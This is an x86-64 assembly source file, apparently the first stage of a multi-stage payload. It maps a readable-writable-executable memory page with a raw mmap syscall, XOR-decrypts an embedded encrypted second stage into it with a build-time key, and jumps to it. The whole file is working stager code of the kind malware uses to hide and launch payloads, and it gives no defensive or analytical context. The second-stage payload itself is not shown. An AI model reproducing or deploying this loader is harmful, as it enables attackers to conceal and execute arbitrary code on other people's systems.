# Stage 1: position-independent second-generation code.
# mmap()s a fresh RWX page, XOR-decrypts the embedded encrypted stage 2 into
# it, then jumps to it. Assembled with `gcc -c`, extracted with
# `objcopy -O binary`. Only RIP-relative / register-based addressing is used.
#
# The build script defines KEY2 (the stage-2 XOR key) via -DKEY2=... and
# appends the encrypted stage-2 blob after this code through .incbin.
	.text
	.globl	stage1_start
stage1_start:
	# mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
	#      MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
	xorq	%rdi, %rdi			# addr = NULL
	movl	$4096, %esi			# length = 4096
	movl	$7, %edx			# PROT_READ|PROT_WRITE|PROT_EXEC
	movl	$0x22, %r10d			# MAP_PRIVATE|MAP_ANONYMOUS
	movq	$-1, %r8			# fd = -1
	xorl	%r9d, %r9d			# offset = 0
	movl	$9, %eax			# SYS_mmap
	syscall
	# %rax = base of the new mapping

	movq	%rax, %r9			# save the mapping base to jump to
	movq	%rax, %rdi			# dest = mapping
	leaq	enc2_start(%rip), %rsi		# src = encrypted stage 2
	movl	$(enc2_end - enc2_start), %ecx	# byte count (assemble-time const)
1:
	movb	(%rsi), %al
	xorb	$KEY2, %al			# decrypt one byte
	movb	%al, (%rdi)			# write it into the RWX mapping
	incq	%rsi
	incq	%rdi
	decl	%ecx
	jnz	1b

	jmp	*%r9				# enter stage 2

	.align	1
enc2_start:
	.incbin	"stage2.enc"
enc2_end:
	.size	stage1_start, .-stage1_start
